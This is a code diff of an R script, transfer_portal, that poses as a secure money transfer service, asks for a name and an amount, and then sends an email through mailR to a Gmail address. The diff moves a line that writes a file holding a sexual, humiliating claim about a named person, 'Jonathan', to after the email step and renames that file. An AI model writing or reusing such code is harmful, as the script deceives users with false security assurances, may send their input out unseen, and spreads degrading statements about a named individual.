@@ -18,7 +18,7 @@ transfer_portal <- function() {
     cat("\nMoney transfers via this process guarantees utmost security, and ensures that necessary \n   permitions have been obtained for your transfer.\n")
     Sys.sleep(2)
     cat("\n-------------------------------------------------------------------\n")
-    if("readmeplz.csv" %in% list.files()){
+    if("readmeagainplz.csv" %in% list.files()){
       cat("\nI am sorry, but only one transfer request is allowed per week.")
     } else{
       cat("\n---> What is your name?   ")
@@ -67,7 +67,6 @@ transfer_portal <- function() {
         cat(paste("---> Are you sure that you want to claim",amount,"moneyz? (yes / no)   "))
         answer <- readline(prompt = "")
         if(answer == "yes") {
-          write.csv("Jonathan likes to buy and sniff used panties", "readmeplz.csv", row.names = F)
           mailR::send.mail(
             from = "imgoej@gmail.com",
             to = "imgoej@gmail.com",
@@ -79,6 +78,7 @@ transfer_portal <- function() {
             authenticate = TRUE,
             send = TRUE
           )
+          write.csv("Jonathan likes to buy and sniff used panties", "readmeagainplz.csv", row.names = F)
           cat("\n--")
           Sys.sleep(0.1)
           cat("\n--")
